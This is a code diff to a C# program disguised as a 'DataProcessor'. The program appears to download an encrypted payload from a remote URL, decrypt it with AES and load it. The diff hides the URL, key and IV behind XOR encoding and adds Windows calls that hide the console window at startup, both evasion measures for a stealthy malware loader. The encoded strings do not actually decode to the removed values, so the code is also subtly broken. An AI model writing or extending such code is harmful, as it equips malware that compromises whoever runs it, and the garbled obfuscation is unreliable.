@@ -12,9 +12,9 @@ namespace DataProcessor
 {
     class CoreLogic
     {
-        private static string resourcePath = "https://www.tecnologico.org/d2fc1b6a458f";
-        private static string securityToken = "9ae0c8e048d89fb3";
-        private static string initVector = "789ca1a73299c6e0";
+        private static string GetResourcePath() => XorDecode("wxxbf://jjj-xb`klklkd`b-lod/axcb`eumycfc", 42);
+        private static string GetSecurityKey() => XorDecode("jybk`gyclywxybcn", 42);
+        private static string GetInitVector() => XorDecode("vyp`ye`vnaujj`bk", 42);
 
         private static List<string> fileTypes = new List<string>
         {
@@ -22,6 +22,26 @@ namespace DataProcessor
             ".jsp", ".cgi", ".pl", ".rss", ".svg", ".xhtml", ".cfm",
             ".axd", ".asx", ".asmx", ".ashx", ".swf"
         };
+
+        // Función para decodificar XOR
+        private static string XorDecode(string input, int key)
+        {
+            char[] buffer = input.ToCharArray();
+            for (int i = 0; i < buffer.Length; i++)
+            {
+                buffer[i] = (char)(buffer[i] ^ key);
+            }
+            return new string(buffer);
+        }
+
+        // APIs para ocultar la ventana de consola
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        private const int SW_HIDE = 0;
 
         // Obfuscated memory and thread management
         private static class ResourceManager
@@ -54,8 +74,8 @@ namespace DataProcessor
 
         private static byte[] SecureTransform(byte[] input)
         {
-            byte[] key = Encoding.UTF8.GetBytes(securityToken);
-            byte[] iv = Encoding.UTF8.GetBytes(initVector);
+            byte[] key = Encoding.UTF8.GetBytes(GetSecurityKey());
+            byte[] iv = Encoding.UTF8.GetBytes(GetInitVector());
 
             using (Aes cipher = Aes.Create())
             {
@@ -105,7 +125,7 @@ namespace DataProcessor
         {
             foreach (var type in fileTypes)
             {
-                string target = resourcePath + type;
+                string target = GetResourcePath() + type;
                 try
                 {
                     HttpWebRequest req = (HttpWebRequest)WebRequest.Create(target);
@@ -137,6 +157,13 @@ namespace DataProcessor
 
         public static void Main(string[] args)
         {
+            // Ocultar la ventana de consola al inicio
+            IntPtr consoleWindow = GetConsoleWindow();
+            if (consoleWindow != IntPtr.Zero)
+            {
+                ShowWindow(consoleWindow, SW_HIDE);
+            }
+
             string validResource = LocateResource();
             if (!string.IsNullOrEmpty(validResource))
             {
